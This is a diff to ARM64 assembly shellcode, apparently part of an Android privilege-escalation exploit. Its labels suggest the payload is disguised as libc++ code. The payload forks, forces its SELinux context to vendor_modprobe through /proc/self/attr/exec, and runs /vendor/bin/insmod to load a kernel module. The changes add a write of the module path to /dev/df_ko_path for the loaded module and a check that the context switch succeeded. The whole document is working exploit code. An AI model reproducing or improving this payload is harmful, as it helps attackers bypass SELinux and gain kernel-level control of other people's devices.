@@ -13,6 +13,8 @@ libcxx_data:
 
 mutex_file:
     .asciz "/dev/df"
+ko_path_file:
+    .asciz "/dev/df_ko_path"
 selinux_ctx:
     .asciz "u:r:vendor_modprobe:s0"
 selinux_ctx_end:
@@ -100,6 +102,19 @@ libcxx_start:
     cbnz    w0, myexit
 
     // ── grandchild: insmod the KO as vendor_modprobe ──────────────────────
+    // Write KO target path to /dev/df_ko_path for the LKM to invalidate
+    mov     x0, -100
+    adr     x1, ko_path_file
+    movl    x2, (O_WRONLY|O_CREAT|O_TRUNC|O_CLOEXEC)
+    mov     x3, #0666
+    mov     x8, #SYS_openat
+    svc     0
+    tbnz    w0, #31, 1f          // skip if open failed (non-fatal)
+    mov     x1, ko_target
+    mov     x2, #64              // max path length
+    mov     x8, #SYS_write
+    svc     0
+1:
     // open /proc/self/attr/exec
     mov     x0, -100
     adr     x1, attr_exec
@@ -110,6 +125,8 @@ libcxx_start:
     mov     x2, selinux_ctx_end - selinux_ctx
     mov     x8, #SYS_write
     svc     0
+    cmp     w0, #0              // verify SELinux context write succeeded
+    b.lt    myexit              // negative = error, bail
 
     // execve("/vendor/bin/insmod", [exe_path, ko_target, NULL], NULL)
     adr     x1, exe_path
